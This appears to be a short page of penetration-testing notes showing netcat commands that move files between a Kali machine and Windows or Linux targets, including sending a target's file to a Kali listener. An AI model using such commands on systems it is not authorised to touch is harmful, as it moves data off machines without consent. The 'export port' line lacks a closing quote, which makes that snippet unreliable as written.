---
title: Netcat File Transfer
layout: default
nav_order: 5
parent: File Transfers

---

# Netcat
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }
1. TOC
{:toc}

---

### Netcat File Transfers (Kali to Windows)
1. Sending From Windows
```bash
nc -w 3 192.168.119.239 1234 < file.txt
```

2. Receiving on Kali
```bash
nc -l -p 1234 > file.txt
```

---

1. Sending from Kali
```bash
export WinIP="192.168.128.10"
export port="1234
nc -w 3 $WinIP $port < out.file
```

2. Receiving on Windows
```bash
nc -l -p 1234 > out.file
```

### Netcat File Transfers (Kali to Linux)
1. Listen for file on target machine:
```bash
nc -nvlp $PORT > $FILENAME
```

2. Send file from Kali machine:
```bash
nc -nv $TARGET_IP $PORT < /path/to/file
```